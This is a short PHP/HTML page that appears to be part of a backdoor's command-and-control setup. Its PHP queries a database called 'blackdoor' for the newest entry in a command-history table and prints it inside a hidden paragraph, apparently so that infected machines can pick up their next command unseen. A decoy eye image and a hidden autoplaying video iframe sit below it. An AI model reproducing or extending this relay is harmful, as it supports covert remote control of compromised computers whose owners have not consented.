<p style="display:none;" name="sent"><?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "blackdoor";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

$sql2 = "SELECT * FROM cmdhist ORDER BY ID DESC LIMIT 1";
$result2 = $conn->query($sql2);

if ($result2->num_rows > 0) {
while($row = $result2->fetch_assoc()) {
echo $row["CMD"];
}
} else {
echo "No Commands..";
}

$conn->close();
?></p>
<img style="margin-left:auto;margin-right:auto;display:block;" src="img/eye.png">
<iframe width="560" height="315" src="https://www.youtube.com/embed/LYcDjTxbgg4?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="visibility: hidden;"></iframe>